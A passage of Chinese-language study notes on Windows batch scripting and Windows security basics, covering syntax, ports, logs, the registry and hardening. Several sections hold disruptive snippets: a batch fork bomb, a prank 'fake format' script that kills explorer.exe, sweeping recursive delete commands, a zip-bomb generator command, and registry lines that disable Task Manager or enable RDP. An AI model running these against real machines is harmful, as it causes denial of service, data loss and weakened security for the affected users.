class="line"><span class="built_in">echo</span>+ </span><br><span class="line"><span class="built_in">echo</span>/ </span><br><span class="line"><span class="built_in">echo</span>[ </span><br><span class="line"><span class="built_in">echo</span>] </span><br><span class="line"><span class="function">echo: </span></span><br><span class="line"><span class="function"><span class="title">echo</span>. </span></span><br><span class="line"><span class="function"><span class="title">echo</span>\ </span></span><br><span class="line"><span class="function">效率依次递减</span></span><br></pre></td></tr></table></figure><h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3 功能"></a>3 功能</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="comment">rem 或 :: （双冒号）：注释</span></span><br><span class="line"><span class="built_in">cls</span>：清屏</span><br><span class="line"><span class="built_in">pause</span>：暂停</span><br><span class="line"><span class="keyword">exit</span>：退出</span><br></pre></td></tr></table></figure><h3 id="4-占位符"><a href="#4-占位符" class="headerlink" title="4 占位符"></a>4 占位符</h3><blockquote><p>%1 %2：第一个输入参数，第二个输入参数</p></blockquote><h3 id="5-goto-跳转"><a href="#5-goto-跳转" class="headerlink" title="5 goto    跳转"></a>5 goto    跳转</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">label</span>：标签</span><br><span class="line"><span class="function">goto label：跳转到标签处</span></span><br></pre></td></tr></table></figure><h3 id="6-重定向"><a href="#6-重定向" class="headerlink" title="6 重定向"></a>6 重定向</h3><ul><li><p>>：输出重定向（覆盖原记录）</p><blockquote><p>例：pause &gt; nul</p><p>di&gt;right.txt</p><p>2&gt;error.txt</p></blockquote></li><li><p>>&gt;：追加输出重定向（追加原记录）</p></li><li><p>&lt;：输入重定向</p></li><li><p>句柄数字：</p><ol><li>键盘输入</li><li>输出到命令提示符窗口</li><li>错误输出</li></ol></li></ul><h3 id="7-特殊字符"><a href="#7-特殊字符" class="headerlink" title="7 特殊字符"></a>7 特殊字符</h3><div class="table-container"><table><thead><tr><th>字符</th><th>作用</th></tr></thead><tbody><tr><td>&#124;</td><td>第一条命令结果作为第二条命令的参数</td></tr><tr><td>&amp;</td><td>无论第一条命令是否成功都会执行后面的命令</td></tr><tr><td>&amp;&amp;</td><td>第一条命令成功了才会执行第二条命令</td></tr><tr><td>&#124;&#124;</td><td>第一条命令失败了才会执行第二条命令</td></tr><tr><td>()</td><td>将命令括起（不常用）</td></tr><tr><td>;</td><td>分隔命令或分隔命令参数（不常用）</td></tr></tbody></table></div><ul><li>案例<ul><li>类似 if else：<code>dir &amp;&amp; echo success || echo failed</code></li></ul></li></ul><h3 id="8-出错码"><a href="#8-出错码" class="headerlink" title="8 出错码"></a>8 出错码</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">%errorlevel%</span>：输出错误码</span><br><span class="line"><span class="keyword">errorlevel</span>：查询上一条命令执行的错误码，<span class="number">0</span>为执行成功</span><br></pre></td></tr></table></figure><h3 id="9-判断"><a href="#9-判断" class="headerlink" title="9 判断"></a>9 判断</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> a ( b ) <span class="keyword">else</span> ( c )：a条件，bc结果</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> a ( b ) <span class="keyword">else</span> ( c )：a条件，bc结果</span><br></pre></td></tr></table></figure><h3 id="10-循环"><a href="#10-循环" class="headerlink" title="10 循环"></a>10 循环</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [command-parameters]</span><br><span class="line"></span><br><span class="line">查找后缀为txt的文件</span><br><span class="line"><span class="keyword">for</span> /r <span class="built_in">path</span> %i <span class="keyword">in</span> (*.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%i（脚本中为%</span>%i）</span><br></pre></td></tr></table></figure><h3 id="11-bat封装成exe"><a href="#11-bat封装成exe" class="headerlink" title="11 bat封装成exe"></a>11 bat封装成exe</h3><blockquote><p><a href="https://www.sogou.com/link?url=hedJjaC291OfPyaFZYFLI4KQWvqt63NBNzAlF3XC1dH29RGaQ0phGA..">bat转exe</a></p></blockquote><ul><li><p>winrar</p><blockquote><p>压缩——后缀改为exe——自解压选项——设置——提取后运行——bat的path</p><p>path例子：./新建文件夹/1.bat</p></blockquote></li><li><p>BatToExe：转化器</p></li></ul><h3 id="12-Bat脚本实例"><a href="#12-Bat脚本实例" class="headerlink" title="12 Bat脚本实例"></a>12 Bat脚本实例</h3><h4 id="12-1-死循环"><a href="#12-1-死循环" class="headerlink" title="12.1 死循环"></a>12.1 死循环</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="variable">%0：再次打开一次自己</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">%</span><span class="number">0</span> | %<span class="number">0</span></span><br><span class="line">不断地自我重建，并占用所有的CPU资源。</span><br></pre></td></tr></table></figure><h4 id="12-2-伪格式化"><a href="#12-2-伪格式化" class="headerlink" title="12.2 伪格式化"></a>12.2 伪格式化</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">Color</span> <span class="number">4</span>A</span><br><span class="line"><span class="built_in">Title</span> 系统损坏器</span><br><span class="line"><span class="built_in">echo</span> <span class="number">1</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> 正在卸载所有软件~~~~~</span><br><span class="line"><span class="built_in">echo</span> 正在格式化C盘 <span class="built_in">format</span> c:\</span><br><span class="line"><span class="built_in">echo</span> 正在格式化D、E、F、G和接入的可移动储存设备 <span class="built_in">format</span> d:\ e:\ f:\ g:\</span><br><span class="line"><span class="built_in">echo</span> 正在删除所有文件~~~~~</span><br><span class="line"><span class="built_in">echo</span> 系统发生严重错误!</span><br><span class="line"><span class="built_in">echo</span> :(</span><br><span class="line"><span class="built_in">taskkill</span> /f /im explorer.exe &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> <span class="number">15</span>秒后电脑将恢复正常，千万别关闭界面，否则......</span><br><span class="line"><span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -n <span class="number">15</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">start</span> c:\windows\explorer.exe</span><br><span class="line"><span class="built_in">echo</span> 哈哈哈哈哈哈哈哈哈</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-3-浏览器"><a href="#12-3-浏览器" class="headerlink" title="12.3 浏览器"></a>12.3 浏览器</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span></span><br><span class="line"><span class="built_in">set</span> /p var=&quot;请输入搜索：&quot;</span><br><span class="line"><span class="built_in">start</span> https://www.sogou.com/sie?query=<span class="variable">%var%</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-4-找文件"><a href="#12-4-找文件" class="headerlink" title="12.4 找文件"></a>12.4 找文件</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tip：文件要是ANSI编码保存</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">title</span> <span class="number">2</span>.txt</span><br><span class="line"><span class="built_in">set</span> space= </span><br><span class="line">:<span class="built_in">start</span></span><br><span class="line"><span class="built_in">set</span> /p var=input name:</span><br><span class="line"><span class="built_in">echo</span> have</span><br><span class="line"><span class="built_in">type</span> <span class="number">2</span>.txt</span><br><span class="line"><span class="built_in">echo</span>=</span><br><span class="line"><span class="built_in">echo</span> choose</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%var%</span></span><br><span class="line"><span class="built_in">type</span> <span class="number">2</span>.txt | <span class="built_in">findstr</span> <span class="variable">%var%</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%var%</span>==<span class="keyword">exit</span> (<span class="keyword">goto</span> end) <span class="keyword">else</span> (<span class="keyword">goto</span> <span class="built_in">start</span>)</span><br><span class="line">:end</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">exit</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-5-清除C盘垃圾"><a href="#12-5-清除C盘垃圾" class="headerlink" title="12.5 清除C盘垃圾"></a>12.5 清除C盘垃圾</h4><blockquote><p>慎用，可能会删除C盘所有东西</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tip：</span><br><span class="line"><span class="variable">%userprofile%</span>\recent：最近访问文件记录的文件夹</span><br><span class="line"><span class="variable">%userprofile%</span>\cookies：删除cookies</span><br><span class="line">systemdrive=C:</span><br><span class="line">windir=C:\windows</span><br><span class="line">userprofile=C:\Users\Adminstrator</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">del</span> temp!</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.tmp</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%windir%</span>\prefetch\*.* <span class="built_in">rd</span> /s /q <span class="variable">%windir%</span>\temp &amp; <span class="built_in">md</span> <span class="variable">%windir%</span>\temp</span><br><span class="line"><span class="built_in">del</span> /f /s /q &quot;<span class="variable">%userprofile%</span>\Local Settings\Temp\*.*&quot;</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*._mp</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%windir%</span>\*.bak</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.log</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.gid</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.chk</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.old</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\recycled\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%userprofile%</span>\cookies\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%userprofile%</span>\recent\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q &quot;<span class="variable">%userprofile%</span>\Local Settings\Temporary Internet Files\*.*</span><br><span class="line"><span class="built_in">del</span> /f /s /q &quot;%userprofile&quot;\recent\*.*&quot;</span><br><span class="line"><span class="built_in">echo</span> end!</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-6-win10添加本地用户和组策略"><a href="#12-6-win10添加本地用户和组策略" class="headerlink" title="12.6 win10添加本地用户和组策略"></a>12.6 win10添加本地用户和组策略</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">pushd</span> &quot;%~dp0&quot;</span><br><span class="line"><span class="built_in">dir</span> /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~<span class="number">3</span>*.mum &gt;List.txt</span><br><span class="line"><span class="built_in">dir</span> /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~<span class="number">3</span>*.mum &gt;&gt;List.txt</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">findstr</span> /i . List.txt <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> dism /online /norestart /add-package:&quot;C:\Windows\servicing\Packages\<span class="variable">%%i</span>&quot;</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-7-压缩包炸弹"><a href="#12-7-压缩包炸弹" class="headerlink" title="12.7 压缩包炸弹"></a>12.7 压缩包炸弹</h4><blockquote><p><a href="https://www.123pan.com/s/giw9-0gRwd">项目位置</a></p><p><a href="https://www.bilibili.com/video/BV1cP411F7jF/">视频演示</a></p><p>pythoon zipbomb.py —mode=quoted_overlap —num-files=num —compressed-size=size &gt; new.zip</p></blockquote><h4 id="12-8-映像劫持"><a href="#12-8-映像劫持" class="headerlink" title="12.8 映像劫持"></a>12.8 映像劫持</h4><blockquote><p><a href="https://space.bilibili.com/493998035">https://space.bilibili.com/493998035</a></p></blockquote><hr><h2 id="四、Windows安全"><a href="#四、Windows安全" class="headerlink" title="四、Windows安全"></a>四、Windows安全</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1Zi4y1b7Qv">author::视频</a></p></blockquote><h3 id="1-Windows-Server"><a href="#1-Windows-Server" class="headerlink" title="1 Windows Server"></a>1 Windows Server</h3><blockquote><p>专门用于服务器</p></blockquote><h3 id="2-用户路径"><a href="#2-用户路径" class="headerlink" title="2 用户路径"></a>2 用户路径</h3><ul><li><p>用户开机自启动路径</p><blockquote><p>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></blockquote></li></ul><h3 id="3-文件分类"><a href="#3-文件分类" class="headerlink" title="3 文件分类"></a>3 文件分类</h3><ul><li><p>系统文件</p><blockquote><p>由系统软件构成的文件。大多数的系统文件只允许用户去调用但不允许用户读改，有的甚至不对用户开放。</p></blockquote></li><li><p>用户文件</p><blockquote><p>指由用户的源代码（.c）、目标文件（.obj）、可执行文件（.exe）、数据等所构成的文件。用户将这些文件委托给系统保管。</p></blockquote></li><li><p>库文件</p><blockquote><p>由标准子例程及常用的例程等所构成的文件。这类文件运行用户调用，但不允许修改。（如.dll）</p></blockquote></li></ul><h3 id="4-文件系统"><a href="#4-文件系统" class="headerlink" title="4 文件系统"></a>4 文件系统</h3><ul><li><p>FAT系统</p><blockquote><p><a href="https://baike.sogou.com/v459447.htm?fromTitle=FAT文件系统&amp;ch=frombaikevr">FAT系统</a></p><p>FAT是File Allocation Table的缩写，即文件分配表。</p></blockquote></li><li><p>NTFS系统</p><blockquote><p>安全，先进，Windows特有的。</p></blockquote></li><li><p>FAT系统和NTFS系统区别<img src="/posts/3bb1b741/FAT和NTFS.jpg" alt="img"></p></li><li><p>光盘文件系统</p><ul><li><p>UDF</p><blockquote><p>UDF是统一光盘格式的缩写。采用标准的封装写入技术将CD-R当作硬盘来用，可在光盘上修改和删除文件。其基本原理是在进行烧录时先将数据打包，并在内存中临时建立一个特殊的文件目录表，同时接管系统对光盘的访问。</p></blockquote></li><li><p>CDFS</p><blockquote><p>Compact Disc File System，是一种适合<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=205061&amp;ss_c=ssc.citiao.link">光存储</a>的文件系统，是用于光盘和光盘镜像的文件系统。</p></blockquote></li></ul></li></ul><h3 id="5-Windows-Server-用户和组"><a href="#5-Windows-Server-用户和组" class="headerlink" title="5 Windows Server 用户和组"></a>5 Windows Server 用户和组</h3><h4 id="5-1-组"><a href="#5-1-组" class="headerlink" title="5.1 组"></a>5.1 组</h4><ul><li><p>Administrators</p><blockquote><p>组内账户有管理员权限，对计算机有最大控制权限，内置的系统管理员账户Administrator就是本地组成员，且无法把它从该组删除。默认无密码。</p></blockquote></li><li><p>Guests</p><blockquote><p>组内账号是没有用户信息、但需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。常见默认成员为Guest。默认无密码。</p></blockquote></li><li><p>Users</p><blockquote><p>基本权利，比Guests强，新加的本地用户自动属于该组。</p></blockquote></li><li><p>Remote Desktop Users</p><blockquote><p>该组成员可以通过远程计算机登录。权限小于Users组账户高于Guests组账户，默认无法本地登录。</p></blockquote></li><li><p>Event Log Readers</p><blockquote><p>该组成员可以从本地计算机中读取事件日志。</p></blockquote></li></ul><h4 id="5-2-访问控制"><a href="#5-2-访问控制" class="headerlink" title="5.2 访问控制"></a>5.2 访问控制</h4><p><img src="/posts/3bb1b741/访问控制.jpg" alt></p><ul><li><p>访问控制列表（Access Control List）</p><blockquote><p>访问权限决定着某个用户可以访问的文件和目录。</p></blockquote></li><li><p>安全描述符（SD)</p><blockquote><p>规定了文件和文件夹的安全数据。</p><p>安全描述符决定安全设置是否只对当前目录有效，或者可以传递给其他文件和目录。</p></blockquote></li><li><p>SD组成</p><ul><li><p>SID（安全标识符）</p><blockquote><p>安全标识符(Security Identifier，SID)</p><p>每个用户和账户组都有一个唯一的SID（通常情况下唯一），它是标识用户、用户组和计算机账户唯一的号码、由计算机名、当前时间、当前用户线程的CPU耗费时间，三个参数确定。</p><p>帐号创建时同时被创建，一旦帐号被删除，安全标识同时也被删除。</p><p>安全标识是唯一的，即使是相同的用户名，每次创建时获得的安全标识都是完全不同的。</p><p>查看sid：<code>sc showsid server</code></p></blockquote></li><li><p>ACE（访问控制项）</p><blockquote><p>指访问控制实体，用于指定特定用户组的访问权限，是权限控制的最小单位。</p><p>ACE三种类型：拒绝访问、允许访问、系统审核（受信者访问对象时产生审核记录）</p></blockquote></li><li><p>ACL（访问控制列表）</p><blockquote><p>是Windows中表示用户（组）权限的列表，ACL包含两种类型。一个是DACL（自主），一个是SACL（系统）。</p></blockquote></li></ul></li><li><p>UAC</p><blockquote><p>用户账户控制</p><p>是为了解决需要管理特权的应用程序问题，让最终用户配置为本地管理员。</p></blockquote></li></ul><h4 id="5-3-账户策略"><a href="#5-3-账户策略" class="headerlink" title="5.3 账户策略"></a>5.3 账户策略</h4><ul><li><p>组（gpedit.msc）</p><blockquote><p>计算机配置——Windows设置——安全设置——账户策略——…</p></blockquote></li><li><p>密码策略</p><blockquote><p>决定密码的设置，如强制性和期限。（使用期限：最短大于最长将永不过期）</p><p>账户锁定策略：决定系统锁定账户的时间，以及锁定谁的账户</p></blockquote></li><li><p>计算机配置——Windows设置——安全设置——本地策略——…</p><ul><li>审核策略：审核管理</li><li>用户权限分配：本地权限</li><li>安全选项：网络安全</li></ul></li></ul><h4 id="5-4-端口"><a href="#5-4-端口" class="headerlink" title="5.4 端口"></a>5.4 端口</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">查看端口：netstat -ano | <span class="built_in">find</span> &quot;:port&quot;</span><br><span class="line">查看进程：tasklist | <span class="built_in">find</span> &quot;pid&quot;</span><br></pre></td></tr></table></figure><ul><li><p>http：80</p><blockquote><p>建议：关闭80端口（提供web服务可以进行端口映射）</p></blockquote></li><li><p>https：443</p><blockquote><p>建议：不发布网站建议关闭该协议。</p></blockquote><ul><li>https步骤<ol><li>客户端发起HTTPS请求</li><li>服务端配置</li><li>传送证书</li><li>客户端解析证书</li><li>传送加密信息</li><li>服务端解密信息</li><li>传输加密后的信息</li><li>客户端解密信息</li></ol></li></ul></li><li><p>DNS：53</p><blockquote><p>基于UDP</p><p>攻击：DNS污染（域名对应错误IP）</p></blockquote></li><li><p>DHCP：67（Server）/68（Client）</p><blockquote><p>67：接收下级客户请求分配IP</p><p>68：向客户发请求成功或失败的回应</p><ul><li>自动分配方式：DHCP服务器为主机指定一个永久性的IP地址</li><li>动态分配方式：DHCP服务器给主机指定一个具有时间限制的IP地址</li><li>手工分配方式：客户端的IP地址是由网络管理员指定的IP地址</li><li>攻击：DHCP欺骗（将IP获取完后自己搭建一个DHCP服务器将用户引入错误的网站）</li></ul></blockquote></li><li><p>SMTP：25</p><blockquote><ul><li>Web界面：A —[http]—ISPServer—[SMTP]—ISPServer—[http]— B</li><li>客户端：A —[SMTP]—ISPServer—[SMTP]—ISPServer—[POP3/IMAP]— B</li><li>攻击：垃圾邮件，端口攻击</li></ul></blockquote></li><li><p>POP3：110</p><blockquote><p>主要用于支持客户端远程管理在服务器上的电子邮件，但该协议是明文传输。</p></blockquote></li><li><p>IMAP：143</p><blockquote><p>直接对服务器的邮件进行操作。</p><p>建议：加入SSL协议保证安全，加入后POP3S：995，IMAPS：993，SMTPS：465/994</p></blockquote></li><li><p>FTP：21</p></li><li><p>Telnet：23</p></li><li><p>远程桌面：3389</p><blockquote><p>改端口号：</p><ol><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</li><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber</li></ol></blockquote></li><li><p>PRC：135</p><blockquote><p>远程过程调用：分布式计算</p></blockquote></li><li><p>NetBIOS：139</p><blockquote><p>常见故障：弱连接，永恒之蓝</p></blockquote></li></ul><h4 id="5-5-系统日志"><a href="#5-5-系统日志" class="headerlink" title="5.5 系统日志"></a>5.5 系统日志</h4><blockquote><p>日志查看器（ eventvwr.msc ）</p></blockquote><ul><li><p>应用程序日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\Application.evtx</p><p>记录操作系统组件产生的事件，例：驱动程序，系统组件，应用崩溃，数据丢失错误。</p></blockquote></li><li><p>系统日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\System.evtx</p><p>记录应用程序和系统程序产生的事件，例：记录程序错误，开发人员自定义，处理程序调试。</p></blockquote></li><li><p>安全日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\Security.evtx</p><p>记录安全审计事件，例：登录日志，对象访问日志，进程追踪日志，特权使用，账号管理，策略变更。</p></blockquote></li><li><p>分析工具</p><ul><li>Log Parser</li><li>LogParser Lizard</li><li>Event Log Explorer</li></ul></li></ul><h4 id="5-6-日志分析"><a href="#5-6-日志分析" class="headerlink" title="5.6 日志分析"></a>5.6 日志分析<img src="/posts/3bb1b741/日志ID.jpg" alt="img"><img src="/posts/3bb1b741/登录类型.jpg" alt="img"></h4><h4 id="5-7-WSUS：辅助补丁服务器"><a href="#5-7-WSUS：辅助补丁服务器" class="headerlink" title="5.7 WSUS：辅助补丁服务器"></a>5.7 WSUS：辅助补丁服务器</h4><h4 id="5-8-注册表安全"><a href="#5-8-注册表安全" class="headerlink" title="5.8 注册表安全"></a>5.8 注册表安全</h4><blockquote><p>注册表编辑器：regedit / regedt32</p></blockquote><ul><li><p>注册表路径</p><blockquote><p>%systemroot%\system32\config\</p></blockquote><ul><li><p>DEFAULT</p><blockquote><p>..\HKEY_USERS.DEFAULT</p></blockquote></li><li><p>SAM</p><blockquote><p>安全账号管理</p><p>..\HKEY_LOCAL_MACHINE\SAM</p></blockquote></li><li><p>SECURITY</p><blockquote><p>..\HKEY_LOCAL_MACHINE\Security</p></blockquote></li><li><p>SOFTWARE</p><blockquote><p>..\HKEY_LOCAL_MACHINE\Software</p></blockquote></li><li><p>SYSTEM</p><blockquote><p>..\HKEY_LOCAL_MACHINE\System\HKEY_CURRENT_CONFIG</p></blockquote></li><li><p>NTUSER.DAT</p><blockquote><p>用户配置文件</p><p>..\HKEY_CURRENT_USER</p></blockquote></li></ul></li><li><p>注册表的五个一级分支：</p><ul><li><p>HKEY<em>CLASSES</em> ROOT</p><blockquote><p>存储Windows可识别的文件类型的详细列表，及相关联的程序</p></blockquote></li><li><p>HKEY_CURRENT_USER</p><blockquote><p>存储当前用户设置的信息</p></blockquote></li><li><p>HKEY_LOCAL_MACHINE</p><blockquote><p>包括安装在计算机上的硬件和软件的信息</p></blockquote></li><li><p>HKEY_USERS</p><blockquote><p>包含使用计算机的用户的信息</p></blockquote></li><li><p>HKEY_CURRENT_CONFIG</p><blockquote><p>这个分支包含计算机当前的硬件配置信息</p></blockquote></li></ul></li><li><p>案例：</p><ul><li><p>win2008开启RDP</p><blockquote><p>reg add HKLM\STSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote></li><li><p>win2008查RDP端口</p><blockquote><p>reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</p></blockquote></li><li><p>修改win服务远程端口</p><blockquote><p>[ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp ]<br>[ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp ]</p></blockquote></li><li><p>禁用任务管理器</p><blockquote><p>[ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System（新建项）\DisableTaskmgr（新建DWORD值） ] = 1</p></blockquote></li><li><p>修改IE主页</p><blockquote><p>[ HEKY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN\Default_Page_URL ] = url</p></blockquote></li></ul></li></ul><h3 id="6-AD域"><a href="#6-AD域" class="headerlink" title="6 AD域"></a>6 AD域</h3><h4 id="6-1-AD域的概念"><a href="#6-1-AD域的概念" class="headerlink" title="6.1 AD域的概念"></a>6.1 AD域的概念</h4><blockquote><p>域是windows网络中独立运行的基本单位。</p><p>Active Directory（活动目录）：是微软Windows Server中负责架构中大型网络环境的集中式目录管理服务（Directory Services）</p><p>工作组：本地，独立，分散的管理模式</p><p>域模式：主从管理</p></blockquote><h4 id="6-2-信任关系"><a href="#6-2-信任关系" class="headerlink" title="6.2 信任关系"></a>6.2 信任关系</h4><blockquote><p>信任关系：A信任B，B可以在身份认证后访问A的资源</p><p>被信任关系：与信任关系相反</p></blockquote><h4 id="6-3-管理"><a href="#6-3-管理" class="headerlink" title="6.3 管理"></a>6.3 管理</h4><blockquote><p>组策略</p></blockquote><h3 id="7-基线配置"><a href="#7-基线配置" class="headerlink" title="7 基线配置"></a>7 基线配置</h3><h4 id="7-1-身份鉴别"><a href="#7-1-身份鉴别" class="headerlink" title="7.1 身份鉴别"></a>7.1 身份鉴别</h4><blockquote><p>SAM：%SystemRoot%\system32\config\sam：相当于Linux中的shadow</p><p><code>wmic useraccount get name,sid</code>：查看 name 和 sid（尾 500 是 admin，501 是 guest）</p><p><code>wmic csproduct get uuid</code>：查看机器码</p></blockquote><ul><li><p>更改本地安全设置保证安全</p><ul><li><p>本地组和用户——用户</p><blockquote><p>admin 修改名称，guest 禁用（属性——常规）</p></blockquote></li><li><p>本地安全策略——密码</p><blockquote><p>复杂性，不小于8位，口令小于90天，5次密码重复设定，6次失败认证锁定，锁定长于1分钟，复位设定，到期两周前提醒。</p></blockquote></li><li><p>本地安全策略——本地策略——网络访问</p><blockquote><p>不允许枚举SAM账号和共享的枚举。</p></blockquote></li><li><p>本地安全策略——本地策略——安全选项</p><blockquote><p>域成员禁止更改机器账户密码。</p></blockquote></li></ul></li></ul><h4 id="7-2-访问控制"><a href="#7-2-访问控制" class="headerlink" title="7.2 访问控制"></a>7.2 访问控制</h4><ul><li><p>计算机管理——本地组和用户——用户</p><blockquote><p>共享账户检查</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>关机权限（只给admin，本地和远程关机）</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>文件权限（只给damin，取得文件或其他对象的所有权）</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>账户本地登录</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>账户网络访问（只给特定用户）</p></blockquote></li><li><p>关闭默认共享</p><blockquote><p>注册表——HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters\——增加AutoShareServer( type : REG_DWORD , value : 0 )</p></blockquote></li><li><p>计算机管理——共享文件夹——共享</p><blockquote><p>设置共享（不设置为 everyone）</p></blockquote></li><li><p>服务——开启时间服务</p><blockquote><p>NTP服务（用于同步网络中服务器与客户端的时间）</p></blockquote></li><li><p>windows文件权限</p><blockquote><p>直接设置大于继承，拒绝大于允许。<br>移动、复制对权限继承性的影响：</p><ol><li>在同一分区内移动文件或文件夹，权限保持不变。在不同分区间移动文件或文件夹，权限继承新位置的权限。</li><li>复制文件或文件夹，权限会继承新位置的权限。</li><li>把文件或文件夹移动或复制到 FAT 分区中时权限会丢失。</li></ol></blockquote></li></ul><h4 id="7-3-安全审计"><a href="#7-3-安全审计" class="headerlink" title="7.3 安全审计"></a>7.3 安全审计</h4><h4 id="7-4-资源控制"><a href="#7-4-资源控制" class="headerlink" title="7.4 资源控制"></a>7.4 资源控制</h4><h4 id="7-5-剩余信息保护"><a href="#7-5-剩余信息保护" class="headerlink" title="7.5 剩余信息保护"></a>7.5 剩余信息保护</h4><h4 id="7-6-入侵防范"><a href="#7-6-入侵防范" class="headerlink" title="7.6 入侵防范"></a>7.6 入侵防范</h4><h4 id="7-7-恶意代码防范"><a href="#7-7-恶意代码防范" class="headerlink" title="7.7 恶意代码防范"></a>7.7 恶意代码防范</h4><hr><h2 id="五、Winodws综合实践"><a href="#五、Winodws综合实践" class="headerlink" title="五、Winodws综合实践"></a>五、Winodws综合实践</h2><h3 id="1-巧用Windows事件日志“隐藏”载荷"><a href="#1-巧用Windows事件日志“隐藏”载荷" class="headerlink" title="1 巧用Windows事件日志“隐藏”载荷"></a>1 <a href="https://xz.aliyun.com/t/12251">巧用Windows事件日志“隐藏”载荷</a></h3><h3 id="2-同步网络时间"><a href="#2-同步网络时间" class="headerlink" title="2 同步网络时间"></a>2 同步网络时间</h3><blockquote><p><a href="https://blog.csdn.net/weixin_43673589/article/details/109144725">bat同步时间</a></p><p><a href="https://blog.csdn.net/lxfhahaha/article/details/72640551">bat同步时间</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 停时间服务</span><br><span class="line"><span class="built_in">net</span> stop w32time</span><br><span class="line"># 开时间服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> w32time</span><br><span class="line"># 